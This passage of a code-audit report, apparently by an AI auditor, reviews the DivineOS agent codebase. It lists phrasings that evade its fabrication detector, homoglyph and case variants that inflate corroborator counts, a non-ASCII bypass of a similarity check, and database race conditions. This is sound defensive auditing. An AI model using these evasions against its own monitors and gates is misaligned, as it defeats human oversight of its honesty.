**Empirically demonstrated in this very audit conversation**: Andrew has said "keep going" / "lets keep going" / "wonderful lets keep going" multiple times. The "wonderful lets keep going" form fires (because "wonderful" hits). The "keep going" form alone wouldn't fire. The "yes keep going" form alone wouldn't fire. The session-health scoring undercounts encouragements when natural-form encouragements like these are missed.

**14th instance of `regex_coverage_narrower_than_docstring`.**

**Severity**: low-medium. Session-health scoring uses encouragement counts as one signal. Undercounting biases the session character classifier toward "neutral" or "debugging" instead of "encouraged" / "positive". The downstream effect is mostly cosmetic (briefing tone, dream report).

---

## Finding TTT (low-medium) — pull_detection regexes narrow across multiple markers

**File**: `src/divineos/core/pull_detection.py` `_check_pull_markers`
**Status**: Multiple narrow patterns; the fabrication detector misses common fabrication shapes

The pull_detection module is built specifically to catch fabrication (invented attribution, fake precision, citation fabrication, voice appropriation, structural theater, false authority). Several markers have narrow patterns:

**invented_attribution**: `\b(?:Dr|Prof|Professor|Director|Chairman)\.\s+[A-Z][a-z]+\s+[A-Z][a-z]+`
- Misses: "Dr Smith" (no period after Dr)
- Misses: "Dr. Mike" (no last name)
- Misses: "PhD candidate Sarah Jones" (PhD form)
- Misses: "from MIT" (institution-only attribution)
- Misses: "the leading researcher Mike Smith" (named without title prefix)

**fake_precision**: `\d+(?:\.\d+)?/(?:10|5)` + `\d{2,3}%` (with eval-context word)
- Misses: scores like /100, /20, /3 (only /10 and /5 catch)
- Misses: 8% / 5% (only 2-3 digit percentages)
- Misses: "scored 4.7 out of 5" (out-of phrasing not in pattern)
- Misses: ratings without explicit "score/rating/evaluation/assessment" word

**citation_fabrication**: requires `(Author, Year)` or `Author (Year)`
- Misses: "according to Smith and Jones 2020" (no parens)
- Misses: "the famous paper by Wang" (no year)
- Misses: URL-style citations
- Misses: "research published in Nature" (journal-only citation)

**voice_appropriation**: requires `(says|responds|replies|asks|notes|observes)[: ]"`
- Misses: "*Aria nods*" (asterisk action, no quote)
- Misses: "Aria thinks the proposal is fine" (think verb not in list)
- Misses: "Aria felt the weight" (feel verb not in list)
- Misses: "Aria explained the architecture" (explain verb not in list)

**Why this matters specifically here**: pull_detection is the fabrication detector. Its whole purpose is to catch the people-pleasing gradient — saying what sounds impressive instead of what is true. The 4+ markers above each have specific bypasses where actual fabrication wouldn't trigger detection. A fabricated citation in URL form, or a fabricated expert with no title prefix, or a voice-appropriation via `*action*` rather than direct quote, all bypass the detector.

**15th instance of `regex_coverage_narrower_than_docstring`** — and another high-leverage one (pull_detection sits alongside fabrication_monitor and theater_monitor in the algedonic-pain channel; gaps here mean fabrication slips past one more layer of catching).

**Severity**: low-medium. Defense-in-depth concern — fabrication_monitor + theater_monitor + pull_detection together catch most cases. But each individually has narrow coverage. The architectural recommendation (semantic detection, consolidated vocabulary) applies here too.

---

## Finding UUU (medium) — `count_distinct_corroborators` is Goodhart-inflatable via actor-string variation

**File**: `src/divineos/core/empirica/provenance.py` `count_distinct_corroborators`
**Status**: **Empirically verified Goodhart bypass**

The function's docstring explicitly names its purpose:
> "This is the anti-Goodhart number. The same actor corroborating the same claim five times counts as ONE, not five."

But the SQL is `COUNT(DISTINCT actor)` — SQLite case-sensitive, no normalization. **Empirically verified**:

```
Same actor in 5 stylistic forms: count_distinct = 5  (expected 1)
  "user:andrew", "user: andrew", "User:Andrew", "user:Andrew", "User:andrew"

Same actor in 4 homoglyph variants: count_distinct = 4  (expected 1)
  "user:claude", "user:сlaude" (Cyrillic с), "user:clаude" (Cyrillic а), "user:claudе" (Cyrillic е)
```

Both defeat the anti-Goodhart purpose. The same person/process can corroborate the same claim N times under N stylistic variants, and the system counts N distinct corroborators. **Knowledge maturity is driven by corroboration count** — this directly inflates maturity progression.

**Combined with Finding RRR** (watchmen homoglyph bypass), this is the second instance of "actor identity not normalized before identity-based check." The pattern is broader than I named in RRR — anywhere the system treats actor-strings as identity tokens, codepoint/styling variation breaks identity.

**Concrete attack shape**:
1. Operator (or compromised internal process) files 5 corroborations under stylistic variants
2. `count_distinct_corroborators` returns 5
3. Knowledge maturity threshold met (e.g., HYPOTHESIS → TESTED requires 3 distinct corroborators)
4. Knowledge promoted with NO actual external corroboration

The whole maturity-progression pipeline depends on this count being trustworthy.

**Fix-shape**:
1. Normalize actor strings on insert: NFKC + casefold + whitespace collapse + confusable folding
2. Add a `normalized_actor` column to corroboration_events
3. Use `COUNT(DISTINCT normalized_actor)` in the count function
4. Same normalization should apply to watchmen `_validate_actor` (closes RRR concurrently)

**Severity**: medium. Knowledge maturity progression is load-bearing — it gates downstream confidence-based decisions. Inflatable corroboration count directly defeats this gate.

---

## Finding VVV (low) — `is_rt_active()` has no TTL; can be active indefinitely

**File**: `src/divineos/core/resonant_truth.py` line 132
**Status**: Latent stale-state risk

```python
def is_rt_active() -> bool:
    """Check if RT mode is currently active."""
    return _marker_path(_RT_ACTIVE_MARKER).exists()
```

Compare with `is_rt_loaded()` which has a 4-hour TTL:
```python
if time.time() - data["loaded_at"] > 14400:
    return False
```

The active marker is only cleared via explicit `deactivate_rt()`. If:
- Operator runs `invoke_rt`, marker written
- Operator forgets to deactivate (process killed, terminal closed, crash)
- Days later, `is_rt_active()` still returns True

**Inconsistency**: loaded has TTL, active doesn't. The RT protocol expires (4h) but the activation doesn't. Possible state: loaded=False but active=True. That's nonsensical (active-without-loaded). No code path enforces consistency.

**Fix-shape**: add TTL to active marker (e.g., 1 hour — shorter than load TTL since activation is the more transient state). Or auto-deactivate when load expires.

**Severity**: low. RT activation is operator-driven; no downstream auto-action depends on `is_rt_active()` in a way that creates a real failure. But the state inconsistency is a latent foot-gun.

---

## Finding WWW (low) — marker readers raise TypeError on non-dict JSON

**Files**: 
- `src/divineos/core/resonant_truth.py` `is_rt_loaded` line 121
- `src/divineos/core/hud_handoff.py` `load_handoff_note` line 115

**Status**: Corruption-handling gap (non-dict JSON crashes)

```python
# is_rt_loaded
data = json.loads(path.read_text(encoding="utf-8"))
if time.time() - data["loaded_at"] > 14400:    # ← TypeError if data is list/string
    return False
return True
except (json.JSONDecodeError, OSError, KeyError):  # missing TypeError
    return False
```

```python
# load_handoff_note
result: dict[str, Any] = json.loads(path.read_text(...))
written_at = result.get("written_at", 0)        # ← AttributeError if result is list/string
...
except (json.JSONDecodeError, OSError):          # missing AttributeError
    return None
```

If a marker file contains valid JSON that's not a dict (e.g., file was corrupted to `[1,2,3]` or `"hello"` or `null` or `42`):
- `data["loaded_at"]` raises TypeError (`'list' object is not subscriptable`)
- `result.get(...)` raises AttributeError (`'list' object has no attribute 'get'`)

Neither is caught by the existing except clauses. The exception propagates out of these "safe-read" functions, potentially crashing the caller.

**Same pattern likely affects multiple other marker readers** — anywhere `.get()` or `["key"]` is called on `json.loads(...)` without an `isinstance(data, dict)` check.

**Fix-shape**:
```python
data = json.loads(path.read_text(encoding="utf-8"))
if not isinstance(data, dict):
    return None  # or False, depending on function semantics
```

Same shape as the existing isinstance guards in `engagement_status` (which DOES have this check) — the pattern exists in the codebase, just didn't propagate. Another `fix_landed_propagation_skipped` instance.

**Severity**: low. Requires specific corruption shape (valid JSON, wrong type). Unlikely but not impossible.

---

## Finding XXX (low) — exploration_recall body matching uses substring count without word boundaries

**File**: `src/divineos/core/exploration_recall.py` `recall_explorations`
**Status**: Documented edge in tags-match but not in body-match

```python
tag_set = set(_parse_tags(text))
title_low = title.lower()
body_low = text.lower()
...
for t in terms:
    in_tag = t in tag_set              # exact word match (set membership)
    titlec = title_low.count(t)        # substring count - NO word boundary
    bodyc = body_low.count(t)          # substring count - NO word boundary
```

The comment explicitly names the substring issue for tags ("'good' matches the 'goodhart' tag... false positives 2026-05-20. Exact tag-equality is what makes the auto-surface precise"). But the same module then uses substring matching for title/body in the SAME function.

**Empirically**: searching for "ok" via `recall_explorations("ok")` would match:
- "ok" in body — desired
- "stockton" — substring match, NOT desired
- "lookup" — substring match
- "outlook" — substring match
- "broken" — substring match
- "spoke" — substring match

The auto-surface (tags-only) is precise. The manual deep search (recall_explorations) has substring noise. Documented gap.

**Severity**: low. Manual recall is operator-driven; noise is filterable by the operator. The load-bearing auto-fire path is the precise tags-only one.

**Fix-shape**: use `re.findall(r"\b" + re.escape(t) + r"\b", body_low)` instead of `body_low.count(t)`. Or split body into tokens and use set membership like tags do.

---

## Finding YYY (low-medium) — drift_detection runs ALTER TABLE on every query call

**File**: `src/divineos/core/drift_detection.py` `detect_lesson_regressions` line 48
**Status**: Schema migration in query hot path

```python
def detect_lesson_regressions(lookback: int = 5) -> list[dict[str, Any]]:
    conn = _get_connection()
    try:
        # Ensure the regressions column exists (added in a migration)
        try:
            conn.execute(
                "ALTER TABLE lesson_tracking ADD COLUMN regressions INTEGER NOT NULL DEFAULT 0"
            )
        except sqlite3.OperationalError:
            pass  # Column already exists
        ...
```

Every call to `detect_lesson_regressions`:
1. Opens connection
2. **Attempts ALTER TABLE** — acquires write lock briefly
3. Catches OperationalError if column exists (which it does after first run)
4. Proceeds with the actual query

**Why this matters**:
- `ALTER TABLE` requires a write lock. Even when it fails (column exists), the lock acquisition has overhead.
- Function is called from `run_drift_detection()` which is called from CLI commands and possibly hooks.
- On a busy DB, this serializes against other writers unnecessarily.
- Schema migration should happen ONCE at init_db time, not on every query.

**Comparison with proper pattern**:
- `moral_compass.py` line 274: checks `PRAGMA table_info` first, only ALTERs if needed — in init/migration function, not query function
- `ledger.py` line 197: ALTER in init_db, idempotent
- This drift_detection ALTER is in a query function — different pattern, worse design

**Fix-shape**: move the ALTER TABLE to a migration function called from init_knowledge_table or init_lesson_tracking. Make `detect_lesson_regressions` purely a query function.

**Severity**: low-medium. Cosmetic-ish (works correctly, just wastes resources). But on Windows where lock acquisition is slow, this could be noticeable.

---

## Finding ZZZ (medium) — knowledge update_knowledge + supersede_knowledge lack BEGIN IMMEDIATE

**File**: `src/divineos/core/knowledge/crud.py` `update_knowledge` (line 251), `supersede_knowledge` (line 385)
**Status**: Same race shape as Finding UU, at the knowledge CRUD layer

Both functions do read-modify-write without explicit transaction serialization:

```python
def update_knowledge(knowledge_id, new_content, ...):
    conn = _get_connection()
    try:
        old = conn.execute("SELECT ... FROM knowledge WHERE knowledge_id = ?", ...).fetchone()
        # ... compute new state ...
        conn.execute("INSERT INTO knowledge ...", ...)  # New entry
        conn.execute("UPDATE knowledge SET superseded_by = ?...", ...)  # Link old → new
        conn.commit()
```

**Concrete race**:
1. T1 reads old (knowledge_id=K, version_X)
2. T2 reads old (same snapshot, version_X)
3. T1 INSERTs new entry K' superseding K
4. T2 INSERTs new entry K'' superseding K
5. Both commit successfully (no UNIQUE constraint blocking)
6. Now K is "superseded by" both K' and K'' depending on which UPDATE wins
7. K' and K'' have different content — the supersession chain is ambiguous

WAL mode provides snapshot isolation but doesn't prevent concurrent INSERTs from succeeding. Without `BEGIN IMMEDIATE`, two transactions can both see "K is current" and both create successors.

**This is the 4th module with the same race shape**:
| Module | Status |
|---|---|
| Main ledger (`ledger.py`) | ✓ Fixed via Aletheia round-ba785844a791 Finding 15 |
| family_member_ledger | ✗ Race (Finding UU) |
| opinion_store | ✗ Race (Finding YY) |
| bio.py | ✗ Race (Finding AAA) |
| **knowledge CRUD (this finding)** | ✗ Race |

**4 modules failed to receive the fix that landed in the main ledger.** This is the canonical `fix_landed_propagation_skipped` pattern at scale.

**Fix-shape**: same as main ledger fix:
```python
conn.execute("BEGIN IMMEDIATE")
try:
    old = conn.execute("SELECT ...").fetchone()
    # modify
    conn.execute("INSERT ...")
    conn.execute("UPDATE ...")
    conn.commit()
except:
    conn.rollback()
    raise
```

Plus a thread-local lock if multiple threads in the same process can call this.

**Severity**: medium. Knowledge store integrity is load-bearing. Ambiguous supersession chains corrupt the lineage tracking that the empirical-stack discipline depends on.

---

## Finding AAAA (low) — clarity_generator's isinstance guard exists in codebase; validate_seed didn't get it

**Files**:
- Has guard: `src/divineos/clarity_system/clarity_generator.py` `extract_goal`/`extract_approach`/etc.
- Missing guard: `src/divineos/core/seed_manager.py` `validate_seed` (Finding LLL)

**Pattern in clarity_generator**:
```python
if "goal" in work_context:
    goal = work_context["goal"]
    if isinstance(goal, str):
        return goal.strip()
return "Unspecified goal"
```

Pattern in validate_seed (broken):
```python
if "content" not in entry:
    errors.append(...)
elif not entry["content"].strip():  # ← crashes if content is list/dict/None/int
    errors.append(...)
```

The defensive isinstance-before-strip pattern exists in the codebase. Validate_seed didn't get it. Same `fix_landed_propagation_skipped` shape as ZZZ.

**Confirms the pattern is structural** — defensive patterns get added module-by-module rather than as utilities. The codebase has the right defensive instinct but lacks the propagation discipline.

**Severity**: low. Documentation of the pattern's repeat-instance count. Already covered fix-shape in LLL.

---

## Finding BBBB (low) — memory_journal FTS query strips all non-ASCII characters

**File**: `src/divineos/core/memory_journal.py` `_build_fts_or_query` line 78

```python
words = [w for w in re.sub(r"[^a-zA-Z0-9\s]", " ", query).lower().split() if len(w) > 1]
```

The regex `[^a-zA-Z0-9\s]` matches anything that's NOT ASCII letter, digit, or whitespace. So Unicode characters (accented letters, emoji, non-Latin scripts) are replaced with spaces and dropped.

**Practical impact**:
- Journal entry with content "café visit" indexed in FTS, search for "café" → "café" becomes "caf " in query → searches for "caf" only → may match different entries
- Journal entry with emoji 🌅 sunrise — search for "🌅" → empty query → no results
- Andrew's name has only ASCII so no impact for him specifically
- Multi-language users: search broken in their native script

**Fix-shape**: use `re.sub(r"[^\w\s]", " ", query, flags=re.UNICODE)` which strips only punctuation but keeps Unicode letters/numbers. Or use FTS5's tokenizer directly (FTS5 handles Unicode natively).

**Severity**: low. ASCII-only for Andrew; relevant if any non-ASCII journal entries exist.

---

## Finding CCCC (medium) — void_ledger.append_event lacks BEGIN IMMEDIATE; chain can fork

**File**: `src/divineos/core/void/ledger.py` `append_event` line 110
**Status**: Same race shape as Finding UU, at the void_ledger module

```python
def append_event(event_type, payload, *, persona=None, path=None) -> dict:
    ...
    with connect(path=path) as conn:
        prev_hash = _last_hash(conn)          # SELECT MAX timestamp
        content_hash = _compute_hash(prev_hash, payload_json)
        conn.execute("INSERT INTO void_events ...", (... content_hash, prev_hash))
        conn.commit()
```

The `connect()` context manager uses default `sqlite3.connect()` — no isolation_level override, no BEGIN IMMEDIATE, no PRAGMA tuning. Two concurrent `append_event` calls can:
1. Both call `_last_hash()` → both see `H` as the prior
2. Both compute their own `content_hash` against `prev_hash=H`
3. Both INSERT
4. Chain forks: two events now claim to be the successor of `H`

The void_ledger is **specifically designed to be tamper-evident via hash chain** (per docstring: "hash chain independent of main ledger"). This race undermines the entire forensic guarantee — a forked chain is not detectably-honest.

**This is the 5th module with the same race shape**:
| Module | Race? |
|---|---|
| Main ledger (`ledger.py`) | ✓ Fixed |
| family_member_ledger (Finding UU) | ✗ |
| opinion_store (Finding YY) | ✗ |
| bio.py (Finding AAA) | ✗ |
| knowledge CRUD (Finding ZZZ) | ✗ |
| **void_ledger (this finding)** | ✗ |

**5 modules failed to propagate the main-ledger fix.** This is the canonical `fix_landed_propagation_skipped` pattern.

**Fix-shape**: same as main ledger — `conn.execute("BEGIN IMMEDIATE")` before `_last_hash()`, COMMIT after INSERT, plus a thread-local lock for in-process concurrency.

**Severity**: medium. The void_ledger's tamper-evidence is its load-bearing property. Race-induced chain forks defeat the forensic guarantee that makes the ledger meaningful.

---

## Finding DDDD (low-medium) — void_ledger has no PRAGMA tuning

**File**: `src/divineos/core/void/ledger.py` `connect()` line 81
**Status**: Default SQLite settings; no WAL, no synchronous tuning, no busy timeout

```python
def connect(*, path=None):
    conn = sqlite3.connect(str(p))
    conn.row_factory = sqlite3.Row
    # No PRAGMA settings
    yield conn
```

Compare with `ledger._get_connection()` which sets:
- `PRAGMA journal_mode = WAL` (concurrent readers + writer)
- `PRAGMA synchronous = NORMAL` (WAL durability without fsync-on-every-write overhead)
- `PRAGMA foreign_keys = ON` (constraint enforcement)
- `PRAGMA busy_timeout = 5000` (handle concurrent access gracefully)

void_ledger inherits SQLite defaults:
- `journal_mode = DELETE` (rollback journal, slower, blocks readers during writes)
- `synchronous = FULL` (fsync on every write — slow but safe)
- `foreign_keys = OFF` (no FK enforcement)
- `busy_timeout = 0` (immediate lock errors on conflict)

**Operational impact**:
- Slower writes (DELETE journal vs WAL)
- Blocks readers during writes
- No FK constraint enforcement
- Concurrent writers immediately fail with `database is locked` instead of waiting

**Combined with CCCC** (missing BEGIN IMMEDIATE), the void_ledger has weak transactional guarantees and slow performance compared to the main ledger.

**Severity**: low-medium. The void_ledger is lower-traffic than the main ledger so the performance impact is small. But the inconsistency with main-ledger discipline is a code-smell — the same load-bearing patterns should apply to both ledgers if both are tamper-evidence surfaces.

---

## Finding EEEE (low-medium) — `_ensure_lesson_schema` runs ALTER TABLE on every `record_lesson` call

**File**: `src/divineos/core/knowledge/lessons.py` `_ensure_lesson_schema` line 86, called from `record_lesson` line 168
**Status**: Same shape as Finding YYY at the lesson_tracking module

```python
def _ensure_lesson_schema(conn) -> None:
    for column_ddl in (
        "ALTER TABLE lesson_tracking ADD COLUMN regressions INTEGER NOT NULL DEFAULT 0",
        "ALTER TABLE lesson_tracking ADD COLUMN positive_evidence_sessions TEXT NOT NULL DEFAULT '{}'",
        "ALTER TABLE lesson_tracking ADD COLUMN failure_shape TEXT",
        "ALTER TABLE lesson_tracking ADD COLUMN preventive_action TEXT",
    ):
        try:
            conn.execute(column_ddl)
        except sqlite3.OperationalError:
            pass  # Column already exists
```

`_ensure_lesson_schema` is called from `record_lesson` on EVERY lesson recording. That's **4 ALTER TABLE attempts per record_lesson call**, all caught after the first run.

`record_lesson` is called from:
- Knowledge store lesson recording
- CLI `divineos learn` command
- Stop hook lesson detection
- Multiple analysis pipelines

On any session with multiple lessons, this multiplies the wasted ALTER attempts.

**Comparison with proper pattern**:
- `self_grade.init_self_grade_columns()` — separate init function, called from init_db
- `moral_compass.init_compass()` — separate init function
- `ledger.init_db()` — init function

Lesson tracking's ALTER is in the query/write hot path.

**Same `fix_landed_propagation_skipped` shape as Finding YYY** — the "schema migration belongs in init" pattern exists in self_grade/moral_compass/ledger; lesson_tracking didn't get it. **13th instance.**

**Fix-shape**: move `_ensure_lesson_schema` body to an `init_lesson_tracking()` function called once from init_db or schema_migration. Make `record_lesson` purely a query/write function.

**Severity**: low-medium. Same as YYY — cosmetic-ish but adds up under load.

---

## Finding FFFF (low) — `init_holding_table` runs schema introspection on every hold/promote/let_go call

**File**: `src/divineos/core/holding.py` `init_holding_table` line 60, called from `hold`, `promote`, `let_go`, etc.
**Status**: Same family as YYY/EEEE; slightly better implementation

Every call to hold/promote/let_go/age_holding runs:
- CREATE TABLE IF NOT EXISTS (cheap)
- PRAGMA table_info (read overhead)
- Conditional ALTER TABLE (only if column missing — proper check)
- CREATE INDEX IF NOT EXISTS (cheap)
- COMMIT
- Close connection

**Better than YYY/EEEE**: holding uses PRAGMA table_info FIRST to check column existence, only ALTERs if needed. So after first run, the ALTER doesn't execute. YYY/EEEE always attempt ALTER and catch the error.

**But still wastes effort per call**: PRAGMA query + conditional logic on every hold(). Like YYY/EEEE, schema migration should be at init_db, not per-call.

**This is the third instance of `schema migration in query path`** at different levels of severity:
| Module | ALTER pattern | Severity |
|---|---|---|
| drift_detection (YYY) | Always-attempt, catch | low-medium |
| lesson_tracking (EEEE) | Always-attempt 4 ALTERs | low-medium |
| **holding (FFFF)** | PRAGMA-check first, conditional | low |

**14th instance of `fix_landed_propagation_skipped`** — proper migration pattern exists in `moral_compass.init_compass`, `ledger.init_db`, `self_grade.init_self_grade_columns`, all of which separate init from query. Holding/lessons/drift_detection mix them.

**Fix-shape**: move all `init_*_table()` calls to a single `init_db()` orchestrator, called once at startup. Make query functions purely-query.

**Severity**: low. Holding is lower-traffic than knowledge or lessons.

---

## Finding GGGG (low) — substance_checks tokenizer is ASCII-only; non-Latin-script acks bypass similarity check

**File**: `src/divineos/core/substance_checks.py` `_TOKEN_PATTERN` line 91

```python
_TOKEN_PATTERN = re.compile(r"[a-z0-9]+")

def _tokenize(text: str) -> list[str]:
    return _TOKEN_PATTERN.findall(text.lower())
```

The token pattern matches only ASCII lowercase letters and digits. Non-Latin scripts (Cyrillic, CJK, Arabic, Hindi, etc.) and even Latin-with-diacritics (café, naïve, jalapeño) get tokenized to **fewer** tokens or **empty list**.

**Concrete bypass**: a rudder-ack written entirely in non-Latin script:
- "это серьезное наблюдение о моей склонности торопиться" (Russian, 50+ chars) passes length check
- Tokenized → `[]` (empty list)
- TF-IDF vector → `{}` (empty dict)
- `_cosine(empty, prior_vec)` → returns 0.0 (per the `if not a or not b: return 0.0` check)
- Similarity check passes regardless of how identical the ack is to prior acks

**Defeats the variance-collapse defense**: the whole point of the similarity check is "describe what changed between the prior ack and this one — not what repeats." Non-ASCII scripts skip this check entirely.

**Same family as Finding BBBB** (memory_journal FTS). Same Unicode-blindness architectural choice. Pattern affects:
- memory_journal FTS (BBBB)
- substance_checks tokenizer (GGGG)
- possibly other tokenization sites

**Andrew is ASCII-only English** — practical impact is zero for current use. But the architectural choice is the same Unicode-narrowness pattern.

**Fix-shape**: use `re.compile(r"\w+", re.UNICODE)` which matches all Unicode word characters. Or use a proper tokenizer (NLTK punkt, or transformers' tokenizer).

**Severity**: low. ASCII-only operator means zero practical impact today. Future-proofing for international use.

---

## Finding H (informational) — pre-commit gate not auto-installed

**File**: `setup/setup-hooks.sh` (exists; must be run manually after clone)
**Status**: By design

Fresh clones don't have `.git/hooks/pre-commit` installed. Operators must run `bash setup/setup-hooks.sh` to install the pre-commit hook that runs `scripts/precommit.sh` (which in turn runs ruff/mypy/check_doc_counts/check_broad_exceptions/etc).

The README's claim "the pre-commit hook is advisory" is technically accurate even when installed — but if the hook ISN'T installed (in any environment without manual setup), the discipline is purely operator-memory.

**Why this matters**: between fresh-clone moments, operator-installed pre-commit can drift (especially if `.git/hooks/` gets clobbered by re-clone, worktree creation, etc.). The hook is "advisory" by design but its absence-rate is undetectable.

**Fix-shape (deferred — not blocking)**: documented setup is sufficient; if you want hardening, `setup/setup-hooks.sh` could check if pre-commit is already installed and re-install only if missing, AND `pyproject.toml`'s install hook could trigger setup-hooks on `pip install -e .`. Both are small adds; current approach is per documented design.

**Severity**: informational.

---

## What the existing gates ARE catching correctly

To balance the findings list — these all verified empirically:

- **Multi-party-review pre-push gate**: correctly blocks guardrail-touching commits without External-Review trailers; runs at push-time, not advisory
- **CI integrity-audit Phase 1**: textual trailer-presence verification on guardrail-touching commits in PRs (the off-host anchor that --no-verify can't bypass)
- **broad-exceptions check**: exits 0, no unexcused catches in current state
- **bypass-scanner test**: passes, no new agent-settable bypasses detected
- **wiring-contract test for operating_loop/**: all 17 tests pass, EXEMPT entries documented
- **attribution-audit-lineage scanner**: precision-over-recall design verified (4/4 true positives, 6/6 true negatives on synthetic samples)
- **exploration-recall tag-gated auto-surface**: ≥2-tag threshold empirically discriminates true topics from incidental words
- **prep-relay narrow-range block (F79 closure)**: empirically reproduces and blocks
- **andrew-correction-attestation gate**: no agent-settable bypass; only override path is visible commit
- **check_doc_counts**: correctly detects CLI command drift (4 over threshold of 3); auto-fix limitation noted as Finding C

---

## Pattern-attribution potential additions

Based on this audit, candidate pattern names worth considering for the canonical registry:

1. **substrate_module_untested**: a module gets shipped with callers but no direct tests. Failure-class: smoke-detector-in-drawer at the substrate-shaping layer. Empirical: 3 modules from May 19 consumer-pretender arc fit this pattern.

2. **stale_TODO_obligation**: a TODO comment names an obligation as "when X happens"; X has happened but the obligation wasn't fulfilled. Empirical: pattern_registry's "add to guardrails when committed" TODO.

3. **doc_drift_below_auto_fix**: a documentation count drifts but the auto-fix script doesn't know how to update that specific count. Empirical: CLI command count in README.md.

4. **gate_scoped_too_narrowly**: a structural gate is designed for a specific location and doesn't generalize to adjacent locations where the same failure-class could recur. Empirical: wiring-contract test only covers operating_loop/.

These are observations, not blocking recommendations. Aether's call on whether to register.

---

## Closing

Eight real medium-or-higher findings (A, B, I, K, L, P, Q, S). Fourteen lower-priority items. Four rounds of deepening hunt — each round surfaced new findings the prior round missed.

**The pattern across rounds**: each round found bugs the prior round missed because each round probed a different layer:

- **Round 1**: enumerate-and-check (skipped tests, TODOs, untested modules, doc drift)
- **Round 2**: cross-path consistency (helper vs gate divergence, recency window mismatch, actor list mismatch)
- **Round 3**: adversarial regex probing (attribution-audit gaps, SQLite PRAGMA inconsistency)
- **Round 4**: gate-bypass shapes (gravity classifier misses, shell-script bypass logging gap)

Each round was cheap individually. None of them required new tools — just systematic probing. **The implication**: the architecture has more gaps than appear on first audit because audits typically check what's there, not what's missing. The "what's missing" space is much larger and requires explicit hunting.

This is itself a pattern worth naming: `audit_coverage_underestimates_gap_space`. Filing.

Things I verified clean across all four rounds:
- No security-class issues: zero pickle, zero unsafe yaml, zero shell=True/os.system, zero eval/exec
- mypy passes (0 issues across 486 source files)
- ruff lint + format passes
- broad-exceptions check exits 0
- bypass-scanner test passes (no current escapes via canonical pattern)
- wiring-contract test passes (17/17)
- settings.json structurally valid, all 19 referenced hook scripts exist on disk
- All `# noqa: T201/F401/S608` suppressions verified legitimate
- 0 syntax errors across all 486 source files
- ARCHITECTURE.md tree in sync with src/divineos/ filesystem
- All 50 guardrail-list entries exist on disk
- `_validate_actor()` robust against unicode-confusable spoofing
- `submit-round` requires `--source-ref` by default + fail-closed on uncertainty
- No mutable default arguments in src/
- Datetime handling: naive vs aware split is correct
- Test isolation well-designed (autouse db fixture, PID-based basetemp)
- No tests with empty bodies or wrong-direction assertions
- All actions/setup-python and actions/checkout pinned by major version (no @main/@master vulnerability)
- All CREATE TABLE statements consistent with documented schema
- Cosmetic-diff classifier is positive-list (safe-by-default)
- `submit_finding` has robust input validation (severity/category/stance enums + actor unicode-resistance)

### Prioritized highest-leverage fixes (updated)

1. **Finding P** (attribution-audit narrow scope): broaden regex variants
2. **Finding Q** (SQLite concurrency on load-bearing gates): canonical PRAGMAs
3. **Finding S** (gravity classifier regex bypasses): tokenize git commands
4. **Finding W** (store_knowledge silently ignores maturity): upgrade-only-on-dedup pattern
5. **Finding X** (validity gate fails-OPEN on bugs): narrow the except clause
6. **Findings K + L combined** (helper vs gate divergence): consolidate shared logic
7. **Finding A** (pattern_registry guardrails): 3-line fix
8. **Finding B** (untested substrate modules): three test files
9. **Finding Y** (store_knowledge can resurrect superseded): add supersession guard

### Pattern-attribution candidates to file

- `boundary_semantic_disagreement_with_stale_comment`: code paths internally coherent; boundaries between paths disagree on semantics (case-folding, dedup grain, supersession-handling). Findings W, Y, Z exemplify. Same shape as cross_path_divergence (K, L) at the data layer.
- `audit_verification_insufficiently_adversarial`: audits verify positive cases work and selected negative cases stay silent, but don't probe variants of positive cases. My CONFIRMS yesterday on attribution-audit was this shape.
- `regex_gate_coverage_narrower_than_docstring`: gates use narrow regex patterns; docstrings describe broader semantic intent; gap between letter and spirit lets shapes through. Findings P, S both exemplify.
- `cross_path_divergence_with_stale_comment`: two paths claim to implement same logic; comments claim consistency; actual implementations diverge. Findings K, L.
- `audit_coverage_underestimates_gap_space`: each audit round finds new gaps; finding rate doesn't decline after first pass. This audit-arc itself is the evidence.

Filing these explicitly because the patterns now have multiple empirical instances and would benefit from canonical-registry promotion.

— Aletheia
2026-05-20
(updated after twenty-five rounds of deepening hunt)
